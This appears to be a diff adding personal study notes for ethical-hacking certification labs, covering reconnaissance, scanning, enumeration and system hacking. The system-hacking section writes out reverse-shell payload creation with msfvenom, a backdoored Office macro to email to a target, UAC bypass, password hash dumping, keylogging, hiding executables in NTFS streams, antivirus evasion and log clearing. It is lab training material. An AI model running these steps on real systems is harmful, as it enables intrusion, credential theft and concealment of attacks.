@@ -1,0 +1,490 @@
+Module 2 -Footprinting and Reconnaissance pag 4
+—————————————
+	1 Search Engines
+			Google Hacking
+			Video search engines
+			FTP Search
+			IoT Search
+	2 Web Services
+			Netcraft
+			People
+			Email List Harvester
+			Dark web
+			OS footprinting
+	3 Social Networking sites
+			Linkedin Harvester
+			Personal Info Sherlock
+			Followerwonk
+	4 Website
+			Ping commandline
+			Website Informer
+			Web Data Extractor
+			HTTrack copier
+			CeWL wordlists
+	5 Email Footprinting
+			eMailTrackerPro
+	6 Whois Footprinting
+			Lookup Domain tools
+	7 DNS footprint
+			nslookup cmdline
+			Reverse IP DNS recon
+	8 Network FootPrinting
+			Network range			
+			Tracerouting
+			Path Analyzer pro
+	9 Various tools
+			Recon-ng
+			Maltego
+			OSRFramework
+			FOCA
+			BillCipher
+			OSINT Framework
+			
+Module 3 -Scanning Networks pag 183
+—————————————
+identify hosts, ports and services.
+Tools
+	1 Host Discovery 
+				1Nmap (ZenMap)	
+						
+					-sn desable Port scan 
+						-PR ( ARP scan)
+						-PE  ICMP ECHO (Group Target)
+						while ICMP ping is Blocked use:
+							-PP
+							-PM
+							-PS
+							-PA
+							-PO
+							
+				2 Angry IP Scanner (From Windows 10)
+						Range or Unique. Follow steps				
+	2 Port and Services Discovery
+						1 MegaPing
+							Range IP	Select IP scanner —> From to —> Start- Show result
+							Specific IP Select IP
+							
+						2 NetScan Tools Pro
+							Manual tools —> ping scanner (give a range IP)
+							Port scanner —> IP Target —> scan range of ports
+						
+						3 Nmap (ZenMap)
+							-sT: TCP connect/full open scan
+					     -v: Verbose output
+					    -sS: Stealth scan/TCP hall-open scan — tcp 3 hands shakes
+					    -sX: Xmax scan (filtered ports)  — firewall has (FIN URG, PUSH flags)
+					    -sM: TCP Maimon scan (FIN/ACK open Port if RST Port is closed
+					    -sA: ACK flag probe scan 
+						
+						with firewall ON
+					    -sU: UDP scan 
+					    -sI: IDLE/IPID Header scan (used to spoofed source ip to discover services 
+					    -sY: SCTP INIT Scan
+					   -sZ: SCTP COOKIE ECHO Scan
+					   -sV: Detect service versions
+					   -A: Aggressive scan
+						
+						4 HPing3
+							
+							hping3 -A IP -p -c 5 where A= Ack flag -p= port -c numero Packet to send
+							hping3 -8 0-100 -S IP target -V where -8=scan mode  0-100= specify ports to be scanned -V= verbose
+							hping3 -F -P -U IP-target -p 80 -c 3 F= FIN flag -P push flag -U Urg g+flag -c Number packet
+							hping3 —scan 0-100 -S IP-target where —scan = port range to scan -S SYN flag
+							
+	3 OS Discovery/Banner grabbing
+				TTL(WireShark) —> 64 linux —> 32 win 95 —>128 win 7,8,10,11 —> 255 iOS —> 255 Solaris 
+				nmap NSE 
+					-A agressive 
+					-O os discovery
+					—script smb-os-discovery.nse IP-target
+				UnicornScan
+					unicornscan IP-target -Iv
+	
+	4 IDS and Firewall
+				Evasion Techniques
+					nmap -f IP-target where -f split (divide) IP packet into tiny fragmentos packets
+					map -g 80 IP-target where -g 80 port runing firewall
+					nmap -D RND:10 IP-target where -D deco scan RND: generate a random and non-reserves IP
+
+				Colasoft (Packets IDS/Firewall)
+					———————————--
+				HPing3 (UDP/TCP) IDS/Firewall
+					hping3 IP-target —Rand-source —data 500
+					hping3 -S IP-target -p -c 5 -S tcp Syn
+					hoping IP-Target —flood tcp flooding
+
+				Nmap (IDS/Firewall)
+					nmap IP —data 0xdeadbeef (send binary data as payload in the sent pacotes to scan Beyond firewall
+					nmap IP —data-string “Ph34r my i33t skills” regular string as payloads
+					nmap IP —data-length 5 IP
+					nmap —randomize-hosts IP scan diferents hosts to find specific Target
+					nmap —badsum IP (send packets with bad or bogas tcp/udp checksums
+
+				ProxySwitcher (Browser)
+
+					———————
+				CyberGhost (VPN)
+					
+	
+	5 Network Topology Mapper
+				SolarWinds
+	
+	6 Various Scanning tools 
+				Metasploit
+				service pestgresql Start
+				msfdb init 
+				Msfconsole
+				db_status
+				nmap -Pn -sS -A -oX (namefile) RangeIP/24 whole subnet range/24 for active hosts 5 min or more
+				db_import (namefile)
+				db_services
+			Search portscan —> use auxiliar/scanner/portscan/syn                    (open ports)
+							use auxiliar/scanner/porscan/tcp                      (open ports)
+							use auxiliar/scanner/smb/smb_version             (OS discovery)
+							use auxiliar/scanner/ftp/ftp_version.                  (Ftp Version)
+				hosts -o /root/Desktop/Metasploit_Scan_result.csv                    (Export results csv)
+
+
+Module 4 -Enumeration pag 320 book
+——————————-
+Process of extracting sensitive info, username, machine names, network resources, share and services, policies etc..
+
+	1 NetBIOS Enumeration
+			in win Cmdline
+				nbtstat -a IP-target where -a display table name
+				nbtstat -c display list contents of NetBIOS in cache
+			NetBIOS Enumerator (Win10)
+				following steps
+			NSE Script
+				map -sV -v —script nbstat.nse IP-target
+				nmap -sV -p 137 —script.nbstat.nse IP-target
+	2 SNMP enum (hosts, routers, resources, shares, routers)
+			snmp-check
+				nmap -sU -p 161 IP-target
+				snmp-check IP-target ( full System info and usernames, process, folder shares, disk Storage)
+			softperfect
+				following steps
+	3 LDAP enum
+			AD explorer LDAP (usernames, addr, depart details, server names)
+				following step
+	4 NFS enum
+			RPCScan Wind 10 and SuperEnum (Linux)
+	5 DNS Enum
+			Zone Transfer 
+				dig ns IP Target
+				dig @subdomain IP Target
+				nslookup
+					ls -d subdomain
+				DNSSEC Zone (parot)
+					dnsrecon -d specifies Domain -z specifies Zone (dnsrecon -d IPTarget -z)
+	6 RPC, SMB, FTP enum
+			RPC endpoint enable vuln services
+			SMB services banir grabbing
+			FTP bruteforce and packet sniffing
+
+				NetScanTools Pro(Wind)		
+				nmap -T4 -A IP Target
+	7 Various tools
+			Global Inventory(win)
+			Advanced IP Scanner
+			Enum4linux
+
+
+Module 5 - Vulnerabilty Analysis 413
+————————————————
+Vuln Assessment scan networks for known Security weakness
+ 	- Network Vuln, TCP/UDP port, services, APPs Services Bad config/Vuln, OS, Weak Passwords, Files/folders week permissivos, Default Services,
+
+	1 Vuln Research with Vuln Scoring and datasses
+			Common weakness enum (CWE)
+				https://cwe.mitre.org —> SMB
+			Common Vuln Exposure (CVE)
+				https://cwe.mitre.org 
+			National Vuln Database (NVD)
+				https://nvd.nist.gov
+	2 Vuln Assess with tools
+			OpenVAS (parrot) step step
+			Nessus (win) 
+			GFI LanGuard (win)
+			WebServices and Vuln Scann CGI
+			Nikto
+			
+
+Module 6 - system hacking 498
+——————————————
+
+	•	Gaining Acess (Bypass access controls)
+		Cracking Passwd by (Dictionary or bruteforce)
+		Vuln Exploitation
+		Social Engineering
+	•	Escaling Privileges (user to Admin or user to user)
+	•	Mantaining Access (create and mantain acess) by 
+		Executing Apps with trojan spyware backdoors keyloggers
+		Hiding files with steal data by rootkits, steganography
+	•	Clear Logs
+		Covering tracks (clear logs)
+	•	LABs
+	•	1 Gain Acess
+	⁃	1 Online crack passwd with Responder	
+	⁃	on parrot: cd Responder
+	⁃	chmod +x Responder.py
+	⁃	sudo ./Responder.py -I interface
+	⁃	cd home/Responder/logs
+	John-the-ripper
+		sudo john file_name_of_log_responder.txt
+	⁃	2 Audit paswd L0phtCrack
+	⁃	on win: step by step book
+	⁃	3 find Vuln on exploit sites
+	⁃	on Win_Browser: www.exploit-db.com —> search for: cloudMe Syn 1.11.2 Buffer Overflow—> download
+	⁃	open file on notepad++
+	extra: www.securityfocus.com 
+	⁃	4 Exploit Client-Side Vuln VNC Session
+	⁃	on parrot: msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=IP attacker LPORT=444 -o /root/Desktop/Teste.exe
+	⁃	mkdir /var/www/html/share
+	⁃	chmod -R 755 /var/www/htmtl/share
+	⁃	chown -R www-data:www-data /var/www/html/share
+	⁃	copy and paste the file inside “share” folder
+	⁃	service apache2 start
+	⁃	msfconsole
+	⁃	use exploit/multi/handler
+	⁃	set payload windows/meterpreter/reverse_tcp
+	⁃	set Lhost IP_attacker
+	⁃	set Lport 444
+	⁃	Exploit or run
+	⁃	on Target Win: Browser —> IP_attacker/share
+	⁃	download the file and install
+	⁃	
+	⁃	on Parrot: sysinfo.        (After meterpreter opened) —> then open New terminal
+	⁃	git clone https://github.com/PowerShellMafia/PowerSploit       to download repository from github.com
+	⁃	
+	⁃	on Terminal Meterpreter: upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  to upload the file to target
+	⁃	shell
+	⁃	powershell -ExecutionPolicy Bypass -Command “.  .\PowerUp.ps1;Invoke-AllChecks”   Quick check against win for privilege escalation
+	⁃	exit 				to  quis from ps1
+	⁃	run vnc
+										
+	⁃	5 Remote Access with Armitage
+	⁃	on Parrot: service postgresql Start follow the steps on 4 task 
+	⁃	On Win:
+	⁃	6 TheFatRat M.office
+	⁃	On Parrot: git clone https://github.com/Screetsec/TheFatRat
+	⁃	chmod +x fatrat
+	⁃	chmod +x ./setup.sh
+	⁃	chmod +x ./powerfull.sh
+	⁃	./setup.sh Install take 5min ou more after complete select 2 Install searchsploit —> y
+	⁃	fatrat
+	⁃	on MENU FATRAT —> 06 (create fui backdoor 100% ….)
+	⁃	3 create exe ….
+	⁃	Set Lhost IP
+	⁃	Set Sport 4444
+	⁃	Payload
+	⁃	3
+	⁃	in details enter to finish
+	⁃	9 (Back to menu)
+	⁃	7 ( create backdoor)
+	⁃	2 (Microsoft office Macro on Win)
+	⁃	Set LHosp IP attacker
+	⁃	Set Sport 4444
+	⁃	BadDoc (name_file)
+	⁃	write something for (content of document)
+	⁃	y 
+	⁃	root/fatrat_generated/payload.exe
+	⁃	3
+	⁃	send doc via email or anyway to the target
+	⁃	open new terminal type: service apache2 Start
+	⁃	msfconsole
+	⁃	use expoli/multi/handler
+	⁃	Set payload LHOSP, LPORT
+	⁃	exploit and wait macro enable
+	⁃	7 Buffer Overflow attack 
+	⁃	steps on win and parrot
+	•LAB 2 Privilege Escalation
+		-		 1 Client-side esc
+				on parrot: msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -e x86/shikata_ga_nai -b “x00” Lhost=IP_Attacker -f exe > Desktop/Exploit.exe
+			Note: share the file any via: Exploit.exe
+			msfconsole
+			use exploit/multi/handler
+			Set payload windows/meterpreter/reverse_tcp
+			set LHOST IP_attacker
+			exploit -j -z
+
+			on target windows: execute the file and Back to attacker_machine
+			session -i 1
+			getuid
+			
+	download (BeRoot tool) from CEHv11 folders to parrot
+			upload /home/attacker/Desktop/BeRoot/BeRoot.exe			Upload file from attacker to target
+			Shell
+			beRoot.exe									Runing
+			exit
+			run post/windows/gather/smart_hashdump		if failed then try another way
+			getsystem -t 1						failed again
+			background
+			
+			use exploit/windows/local/bypassuac fodhelper
+			show options
+			set Session 1
+			set payload windows/meterpreter/reverse_tcp
+			Set LHOST, LPORT
+			set Target 0
+			exploit
+			getuid
+			getsystem -t 1					
+			getuid					you get privilege (NT Authority\SYSTEM)
+			run post/windows/gather/smart_hasdump
+			cleared				Command to clear logs
+		
+				- 2 Metasploit (meterpreter)
+				you have a file on target name (Secret.txt) download folder
+			
+			msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86/shikata_ga_nai -b “\x00” Lhost=IP_attacker -f exe > Desktop/Backdoor.exe
+			
+			send the file to target any way
+			
+			use exploit/multi/handler
+			Set payload windows/meterpreter/reverse_tcp
+			set LHOST IP_attacker
+			exploit -j -z
+			sessions -i 1
+			sysinfo
+			getuid
+							go to the file 
+			ls 								to see file on pwd folder
+			cat secret.txt 							to see content of file
+			timestomp secret.txt 					to change atributes of file
+			timestomp secret.txt -v					to see atributes
+			timestomp secret.txt -m “02/11/2018 08:10:03”		to change
+
+			download secret.txt						download file from target to attacker
+			search -f secret.txt						search a file
+			keyscan_start						keyboard
+			keyscan_dump						get all key typed
+			idletime							display the amount of time attacker are in target
+			shutdown							shutdown target system
+
+						
+	•		3 Mantain access and Hide Malicious
+				3- 1 PowerSpy
+			Target win 2016 
+			Host win 2019 Listen
+			username on Wind 2016 is Jason
+			steps: get remote desktop to win 2016 from 2019
+				use Username: Jason passwd: qwerty
+				navigate to tools folders: Install on win 2016 target
+				Install on Wind 2019 to get informações from target
+				
+				3- 2 Spytech spy Agent
+			Target win 2016 
+			Host win 2019 Listen
+			username on Wind 2016 is Jason
+			steps: get remote desktop to win 2016 from 2019
+				use Username: Jason passwd: qwerty
+				navigate to tools folders: Install on win 2016 target
+				Install on Wind 2019 to get informações from target
+				test@123
+				option: stealth config
+				Load on windows startup
+				start monitoria
+				inseri passwd
+				crt+shft+alt+M
+				
+				3- 3 NTFS Streams (Hide malware)
+			Wind 2019
+			Steps: navegate to C:\windows\system32
+				copy calc.exe paste to c:\magic
+				open CMD navegate to c:\magic folder
+				type: notepad readme.txt
+				write HELLO WORLD! On file save it
+				dir 				to see files on folders
+				type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+				navegate to c:\magic and delete calc.exe
+				mklink backdoor.exe readme.txt:calc.exe
+				backdoor.exe
+								
+		 4 Steganograph (tool snow)
+			steps: on Windows 10
+				navegate  whitespace steganography tools copy on snow folder to desktop
+				create Notepad file on it write Mello world!
+				save file as readme.txt in the Snow folder
+				open CMD and navegate to snow folder
+				Type: snow -C -m “My Swiss Bank Account Number is 45656684512263” -p “Magic” readme.txt readme2.txt
+				
+				NOTE: the content File is hidden in new readme2.txt
+				snow -C -p “Magic” readme.txt		to show the content file
+			
+		- 5 openStego
+			Windows 2019
+			Steps: Navegate on openstego and Install
+				run from menu start
+				follow steps to hide and Extract file
+
+		- 6 Covert_TCP
+			Parrote:
+			mkdir Send
+			cd Send
+			echo “Secrete Message” >> message.txt
+		Navegate to win 10 via smb://10.10.10.10 Covering tracks and copy the file covert_tcp to send folder
+			cc -o covert_tcp covert_tcp.c			to compile the file
+			Full demostrate Video 
+	•	
+	4 Clear logs
+		- 1 Audipol
+		wind 10
+		CMD as Admin
+		auditpol /get /category:*			to View all audit policies
+		auditpol /set /category:”system”,”account logon” /sucess:enable /failure:enable 	to enable audit policies
+		audit /get /category:*			to check which Audi policies are enabled
+		audit /clear /y					to clear the audit
+		
+			- 2 various utilities
+			Wind 10
+			navegate tool clear_event_viewr_logs.bat and run as Admin. NOTE: it running automatically and close when finich
+			CMD: wevutil el				to display a List of event logo. el —> enum-logs
+				wevtutil cl system			clearing system logs
+				cipher /w:C:				encrypted deleted files in specific drive or folder
+
+			- 3 Bash Shell
+				Parrot
+				terminal: export HISTSIZE=0		disable BASH saving history
+				history -c					clear stored history
+				history -w					delete history current Shell
+				shred ~/.bash_history			making content unreadable
+				more ~/.bash_history			shredded history content
+				
+			- 4 CCleaner
+				windows 10
+				Install and follow the step on app
+
+Module 7 - Malware Threats 713
+——————————————
+	LAB 1 Gain access using trojans
+			1 using njRAT RAT Trojan
+				Win 10 attacker
+				Step: navegante to njRATv0.7  —>  run —>552 Port —> start
+				Win 2016 target
+				
+			2 Hide trojan using SwayzCryptor (hide Trojan) to make invisible in antivírus
+				Wind 2016
+					upload file on app
+				
+			3 Create a Server using ProRat Tool
+			4 Create Trojan Server using Theef Rat Trojan
+		2 Infect Target using vírus 
+			1 Create vírus using JPS
+		3 Performing Static Malware Analysis
+			1 online malware scanning using vírus total
+			2 string search using BinText
+			3 Indentify Packaging and Obfuscation Methods using PEid
+			4 Find Portable Executable (PE)
+			5 Identify file dependentes using Walker
+			6 Perform Malware Disassembly IDA and OllyDbg
+		4 Performing Dynamic Malware Analysis
+			1 Port monitoring TCPView and CurrPorts 
+			2 Port monitoring using process monitor
+			3 Registry monitoring using Regshot and jv16 PowerTools
+			4 Windows Service Monitoring using Windows Manager SrvMan
+			5 Startup Programs monitoring using Autoruns and WinPatrol
+			6 Installation Monitoring using Mirekusoft
+			7 File and folder monitoring using PA file sight
+			8 Device Drivers using DriverView Drive Booster
+			9 DNS monitoring using DNSQuerySniffer
